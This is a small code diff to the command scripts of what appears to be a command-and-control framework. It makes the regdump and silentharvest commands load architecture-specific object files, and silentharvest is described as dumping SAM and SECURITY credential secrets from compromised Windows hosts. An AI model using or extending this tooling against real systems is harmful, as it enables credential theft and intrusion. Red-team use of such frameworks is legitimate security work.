@@ -10,7 +10,7 @@ cmd_regdump = (
             .setHandler(lambda agentId, cmdline, args: (
                 path := conquest.get_string(args, 0),
 
-                bof := os.path.join(SCRIPT_DIR, "regdump/regdump.x64.o"),
+                bof := os.path.join(SCRIPT_DIR, f"regdump/regdump.{conquest.arch(agentId)}.o"),
                 params := conquest.bof_pack("z", [
                     path         # z: Output path
                 ]),
@@ -26,7 +26,7 @@ cmd_silentharvest = (
     conquest.createCommand(name="silentharvest", description="Gather SAM and SECURITY secrets using the SilentHarvest method of dumping registry values.", example="silentharvest",
                            message="Tasked agent to gather SAM and SECURITY secrets using the SilentHarvest method of dumping registry values.", mitre=["T1003"])
             .setHandler(lambda agentId, cmdline, args: (
-                bof := os.path.join(SCRIPT_DIR, "SilentHarvest_BOF/dist/silentharvest.x64.o"),
+                bof := os.path.join(SCRIPT_DIR, f"SilentHarvest_BOF/dist/silentharvest.{conquest.arch(agentId)}.o"),
                 conquest.execute_alias(agentId, cmdline, f"bof {bof}") if os.path.exists(bof)
                 else conquest.error(agentId, f"Failed to open object file: {bof}", cmdline)
             ))
